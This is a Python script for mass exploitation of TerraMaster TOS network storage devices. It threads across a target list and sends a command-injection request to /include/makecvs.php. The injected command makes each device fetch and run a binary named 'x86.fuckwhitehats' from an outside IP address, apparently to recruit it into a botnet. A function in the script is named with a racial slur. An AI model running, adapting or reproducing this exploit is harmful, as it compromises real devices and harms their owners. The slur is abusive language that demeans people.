import requests
import time
import sys
import urllib.parse
import random
import requests,threading,time,socket
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import socket
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

#args = parser.parse_args()
def exploit(url):
    headerss = {'User-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; arm7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36'}
    if check_endpoint(url, headerss):
        requests.get(url+'/include/makecvs.php?Event=http%3A%2F%2F192.227.185.106%2Fx86.fuckwhitehats%3B%20.%2Fx86.fuckwhitehats', headers=headerss, verify=False, timeout=15)
        print("Haxxed ---> " + url)

def check_endpoint(url, headerss):
    response = requests.get(url+'/version', headers=headerss, verify=False)
    if response.status_code == 200:
        print(("[+] TerraMaster TOS version: ", str(response.content)))
        return 1
    else:
        #print(("\n[-] TerraMaster TOS response code: ", response.status_code))
        return 0
global running
running = 0
def nigger(x):
    global running
    running += 1
    try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        s.connect((x.split(":")[0],int(x.split(":")[1])))
        s.close()
        exploit("http://"+x)
    except Exception as e:
        print(str(e))
        pass
    running -= 1
jenkins = open(sys.argv[1], "r").read().replace("\r", "").split("\n")
random.shuffle(jenkins)
for x in jenkins:
    while running >= 884:
        time.sleep(0.1)
    threading.Thread(target=nigger, args=(x,)).start()

